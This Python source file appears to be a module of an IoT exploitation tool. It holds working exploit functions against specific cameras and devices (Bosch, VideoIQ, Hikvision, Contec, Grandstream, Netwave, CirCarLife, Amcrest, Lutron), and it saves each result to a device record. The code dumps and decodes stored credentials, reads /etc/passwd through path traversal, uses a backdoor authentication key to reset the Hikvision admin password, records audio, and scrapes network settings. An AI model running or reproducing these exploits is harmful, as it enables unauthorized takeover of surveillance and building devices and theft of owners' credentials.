import base64
import xmltodict
import requests
from bs4 import BeautifulSoup
import re
import json
import xml.etree.ElementTree as ET


def bosch_usernames(device):
    ip = device.ip
    port = device.port
    print("explo")
    return_dict = {}

    try:
        req = requests.get("http://"+ip +":"+port+"/User.cgi?cmd=get_user")

        xml = req.text

        doc = xmltodict.parse(xml)
        for user in doc['USER_SETTING']:
            if user == 'result':
                pass
            else:
                try:
                    username = doc['USER_SETTING'][user]['USERNAME']
                    pwd = doc['USER_SETTING'][user]['PWD']

                    if username:
                        decoded_username = base64.b64decode(username)
                        decoded_pwd = base64.b64decode(pwd)
                        utf_username = decoded_username.decode("utf-8")
                        utf_password = decoded_pwd.decode("utf-8")
                        return_dict[utf_username] = utf_password
                        device.exploit = return_dict
                        device.exploited_scanned = True
                        device.save()
                        print(decoded_username)
                        return return_dict
                except Exception as e:
                    print(str(e))
                    print(e)
                    device.exploit = {"Reason":"Not exploitable"}
                    device.exploited_scanned = True
                    device.save()
                    return {"Reason":"Not exploitable"}

    except Exception as e:
        print(e)
        device.exploit = {"Reason": "Connection error"}
        device.exploited_scanned = True
        device.save()
        return {"Reason": "Connection error"}

def videoiq(device):
    ip = device.ip
    port = device.port

    try:
        req = requests.get("http://" + ip + ":" + port + "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd")
        print(req.text)
        if req.status_code == 200:
            print(req.text)
            resp = req.text
            return_dict = {"Results": resp}
            device.exploit = return_dict
            device.exploited_scanned = True
            device.save()
            return return_dict
        else:
            return {"Reason": "Not exploitable"}
    except:
        return {"Reason":"Not exploitable"}

def hikvision(device):
    ip = device.ip
    port = device.port
    
    # BASIC INFO
    try:
        newPass = "@Dm1N1$Tr80R" # EXAMPLE OF A PASSWORD COMPLIANT WITH LATER FIRMWARES REQUIRING AT LEAST 2 UPPERCASE, 2 lowercase, and 2 SPECIAL CHARACTERS.
        BackdoorAuthArg = "auth=YWRtaW46MTEK"; # AUTHENTICATION KEY.
        userID = "1"
        userName = "Admin"
        URLBase ="http://" + ip + ":" + port + "/"                     # URL BASE FOR FUTURE REQUESTS.
        URLDownload = URLBase + "Security/users?" + BackdoorAuthArg                 # DOWNLOAD REQUEST.
        
        print("[+] Getting User List.")
        
        DownloadResponse = requests.get(URLDownload).text
        req = requests.get(URLDownload)

        if req.status_code == 200:
            for line in DownloadResponse:                                               # RETRIEVING USER LIST
                useridmatch = re.search(r"<id>(.*)<\/id>", line)                        # CHECK FOR USER ID.
                usernamematch = re.search(r"<userName>(.*)<\/userName>", line)          # CHECK FOR USER NAME.
            
                if useridmatch:
                    userID = useridmatch.group(1)
                    print("[+] User ID: " + userID)
            
                if usernamematch:
                    userName = usernamematch.group(1)
                    print("[+] Username: " + userName)
            
            print("[+] Using the User " + userName + ".")
            
            userXML = ( '<User version=""1.0"" xmlns=""http://www.hikvision.com/ver10/XMLSchema"">\r\n<id>' + userID + '</id>\r\n<userName>' + userName + '</userName>\r\n<password>' + newPass + '</password>\r\n</User>' ) # OUR CRAFTED XML CONFIGURATION FILE
            
            #print(userXML)
            
            URLUpload = URLBase + "Security/users/" + userID + "?" + BackdoorAuthArg    # UPLOAD REQUEST.
            
            print("[+] Changing Password now.")
            
            print(requests.put(URLUpload, data=userXML).text)                      # UPLOAD REQUEST, SENDING THE PAYLOAD.
            
            print("[+] Complete. Please login in with these credentials. Username: " + userName + "Password: " + newPass)
            NewCreds = ("New Creds: Username: " + userName + "Password: " + newPass)
            return_dict = {"Results": NewCreds}
            device.exploit = return_dict
            device.exploited_scanned = True
            device.save()
            return return_dict
        else:
            return {"Reason": "Not exploitable"}
    except:
        return {"Reason":"Not exploitable"}

def contec(device):
    ip = device.ip
    port = device.port
    users = []
    try:
        req = requests.get(
            "http://" + ip + ":" + port + "/content/user.php")
        print(req.text)
        if req.status_code == 200:
            soup = BeautifulSoup(req.content)
            for strong_tag in soup.find_all('strong'):
                print(strong_tag.text)
                users.append(strong_tag.text)
            return_dict = {"Results": users}
            device.exploit = return_dict
            device.exploited_scanned = True
            device.save()
            return return_dict
        else:
            return {"Reason": "Not exploitable"}
    except:
        return {"Reason": "Not exploitable"}

def grandstream(device):
    ip = device.ip
    port = device.port
    return_dict = {}
    device.exploited_scanned = True
    try:
        try:
            resp = requests.post(url="https://" + ip + ":" + port + "/cgi", data='action=getInfo', verify=False)
        except Exception as e:
            return {"Reason":"Error connecting to remote target"}

        if resp.status_code != 200:
            return {"Reason": "Did not get a 200 OK on getInfo request"}

        if resp.text.find('{ "response":') != 0:
            return {"Reason": "Unexpected response"}

        try:
            parsed_response = json.loads(resp.text)
        except Exception:
            return {"Reason": "Unable to parse json response"}

        return_dict['Model'] = parsed_response['response']['model_name']
        return_dict['Version'] = parsed_response['response']['prog_version']

        match = re.match('^([0-9]+)\.([0-9]+)\.([0-9]+)\.([0-9]+)$',
                         parsed_response['response']['prog_version'])
        if not match:
            return {"Reason":"Failed to extract the remote targets version"}

        major = int(match[1])
        minor = int(match[2])
        point = int(match[3])
        patch = int(match[4])

        if (major > 1) or (major == 1 and minor > 0) or (major == 1 and minor == 0
                                                         and point > 19) or (
                major == 1 and minor == 0 and point == 19 and patch >=
                20):

            return_dict["verdict"] = "Unaffected version"
            device.exploit = return_dict
            device.save()
            return return_dict


        else:
            return_dict["verdict"] = "Vulnerable version"
            device.exploit = return_dict
            device.save()
            return return_dict
    except:
        return {"Reason": "Failed badly"}

def netwave(device):
    ip = device.ip
    port = device.port
    return_dict = {}
    device.exploited_scanned = True
    try:
        req = requests.get(
            "http://" + ip + ":" + port + "/get_status.cgi")
        content = req.text
        spl = content.split(";")

        for i in spl:
            u = i.split("=")
            if i != "\n":
                return_dict[u[0].lstrip()] = u[1]
        device.exploit = return_dict
        device.save()
        return return_dict

    except Exception as e:
        print(e)
        return {"Reason": "Not exploitable"}

def circarlife(device):
    ip = device.ip
    port = device.port
    return_dict = {}
    device.exploited_scanned = True
    try:
        req = requests.get(
            "http://" + ip + ":" + port + "/services/user/values.xml?var=STATUS")
        content = req.text
        tree = ET.ElementTree(ET.fromstring(content))
        root = tree.getroot()

        for elem in root:
            for c,subelem in enumerate(elem):
                if c == 0:
                    helper = subelem.text
                    return_dict[helper] = ""
                else:
                    return_dict[helper] = subelem.text

        device.exploit = return_dict
        device.save()
        return return_dict

    except Exception as e:
        print(e)
        return {"Reason": str(e)}

def amcrest(device):
    ip = device.ip
    port = device.port
    return_dict = {}
    device.exploited_scanned = True

    try:
        req = requests.get(
            "http://" + ip + ":" + port + "/videotalk",stream=True)

        with open('videotalk_'+ip, 'wb') as output:
            output.write(req.content)
            return_dict["Status"] = "Videotalk has been saved as videotalk_"+ip

        device.exploit = return_dict
        device.save()
        return return_dict

    except Exception as e:
        print(e)
        return {"Reason": str(e)}

def lutron(device):
    ip = device.ip
    port = device.port
    return_dict = {}
    device.exploited_scanned = True

    try:
        req = requests.get(
            "http://" + ip + ":" + port + "/deviceIP")

        to_parse = BeautifulSoup(req.text, "lxml")
        return_dict["Device IP"] = to_parse.find('input', {'name': 'IPADDR'}).get('value')
        return_dict["Mask"] = to_parse.find('input', {'name': 'SUBNETMK'}).get('value')
        return_dict["Gateway"] = to_parse.find('input', {'name': 'GATEADDR'}).get('value')
        return_dict["MAC address"] = to_parse.find('input', {'name': 'MacAddr'}).get('value')
        return_dict["NBNDEV"] = to_parse.find('input', {'name': 'NBNDEV'}).get('value')
        return_dict["NBNMSTR"] = to_parse.find('input', {'name': 'NBNMSTR'}).get('value')
        return_dict["NBNUSER"] = to_parse.find('input', {'name': 'NBNUSER'}).get('value')
        return_dict["Project"] = to_parse.find('input', {'name': 'PROJECT'}).get('value')

        device.exploit = return_dict
        device.save()
        return return_dict

    except Exception as e:
        print(e)
        return {"Reason": str(e)}